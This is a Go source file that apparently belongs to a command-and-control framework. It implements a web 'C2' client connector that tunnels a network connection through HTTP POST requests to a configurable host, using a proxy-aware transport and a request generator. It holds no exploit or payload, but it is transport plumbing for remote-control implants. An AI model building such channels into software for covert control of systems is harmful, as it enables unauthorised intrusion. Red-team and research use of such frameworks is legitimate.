package wc2

import (
	"bytes"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/com/limits"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

var (
	// Default is the default web c2 client that can be used to create client connections.
	Default = &Client{Generator: DefaultGenerator, Client: DefaultClient}

	// DefaultClient is the HTTP Client struct that is used when the provided client is nil.
	// This is a standard struct that uses DefaultTimeout as the timeout value.
	DefaultClient = &http.Client{Timeout: com.DefaultTimeout, Transport: DefaultTransport}

	// DefaultTransport is the default HTTP transport struct that contains the default settings
	// and timeout values used in DefaultClient. This struct uses any set proxy settings contained
	// in the execution environment.
	DefaultTransport = &http.Transport{
		Proxy:                 http.ProxyFromEnvironment,
		DialContext:           (&net.Dialer{Timeout: com.DefaultTimeout, KeepAlive: com.DefaultTimeout, DualStack: true}).DialContext,
		MaxIdleConns:          limits.SmallLimit(),
		IdleConnTimeout:       com.DefaultTimeout,
		TLSHandshakeTimeout:   com.DefaultTimeout,
		ExpectContinueTimeout: com.DefaultTimeout,
		ResponseHeaderTimeout: com.DefaultTimeout,
	}

	bufs = &sync.Pool{
		New: func() interface{} {
			return new(bytes.Buffer)
		},
	}
)

// Client is a simple struct that supports the C2 client connector interface. This can be used by
// clients to connect to a Web instance. By default, this struct will use the DefaultClient struct.
type Client struct {
	_         [0]func()
	Generator Generator
	*http.Client
}
type client struct {
	_      [0]func()
	in     *http.Response
	gen    Generator
	out    *bytes.Buffer
	host   string
	client *http.Client
	parent *Server
}

func (c *client) Close() error {
	if c.out != nil {
		if c.out.Len() > 0 {
			c.request()
		}
		c.out.Reset()
		bufs.Put(c.out)
		c.out = nil
	}
	if c.in == nil {
		return nil
	}
	err := c.in.Body.Close()
	c.in = nil
	return err
}
func (client) LocalAddr() net.Addr {
	return empty
}
func (c client) RemoteAddr() net.Addr {
	return addr(c.host)
}
func rawParse(r string) (*url.URL, error) {
	var (
		i   = strings.IndexRune(r, '/')
		u   *url.URL
		err error
	)
	if i == 0 && len(r) > 2 && r[1] != '/' {
		u, err = url.Parse("/" + r)
	} else if i == -1 || i+1 >= len(r) || r[i+1] != '/' {
		u, err = url.Parse("//" + r)
	} else {
		u, err = url.Parse(r)
	}
	if err != nil {
		return nil, err
	}
	if len(u.Host) == 0 {
		return nil, xerr.New(`parse "` + r + `": empty host field`)
	}
	if u.Host[len(u.Host)-1] == ':' {
		return nil, xerr.New(`parse "` + r + `": invalid port specified`)
	}
	return u, nil
}
func (client) SetDeadline(_ time.Time) error {
	return nil
}
func (c *client) Read(b []byte) (int, error) {
	if c.in == nil {
		var err error
		c.in, err = c.request()
		if c.out != nil {
			c.out.Reset()
			bufs.Put(c.out)
			c.out = nil
		}
		if err != nil {
			return 0, err
		}
	}
	return c.in.Body.Read(b)
}
func (c *client) Write(b []byte) (int, error) {
	if c.out == nil {
		c.out = bufs.Get().(*bytes.Buffer)
	}
	return c.out.Write(b)
}
func (client) SetReadDeadline(_ time.Time) error {
	return nil
}
func (client) SetWriteDeadline(_ time.Time) error {
	return nil
}
func (c *client) request() (*http.Response, error) {
	var (
		r   *http.Request
		o   *http.Response
		err error
	)
	if c.parent != nil {
		r, _ = http.NewRequestWithContext(c.parent.ctx, http.MethodPost, "", c.out)
	} else {
		r, _ = http.NewRequest(http.MethodPost, "", c.out)
	}
	if i, err := rawParse(c.host); err == nil {
		r.URL = i
	}
	if len(r.URL.Host) == 0 {
		r.URL.Scheme, r.URL.Host = "", c.host
	}
	if len(r.URL.Scheme) == 0 {
		if c.parent != nil && c.parent.tls != nil {
			r.URL.Scheme = "https"
		} else {
			r.URL.Scheme = "http"
		}
	}
	c.gen.prepRequest(r)
	switch {
	case c.client != nil:
		o, err = c.client.Do(r)
	case c.parent != nil:
		o, err = c.parent.Client.Do(r)
	default:
		o, err = DefaultClient.Do(r)
	}
	if err != nil {
		return nil, err
	}
	if o.Body == nil {
		return nil, io.ErrUnexpectedEOF
	}
	return o, nil
}

// Connect creates a C2 client connector that uses the same properties of the Client and
// Generator instance parents.
func (c Client) Connect(s string) (net.Conn, error) {
	n := &client{gen: c.Generator, host: s, client: c.Client}
	if n.gen.empty() {
		n.gen = DefaultGenerator
	}
	return n, nil
}
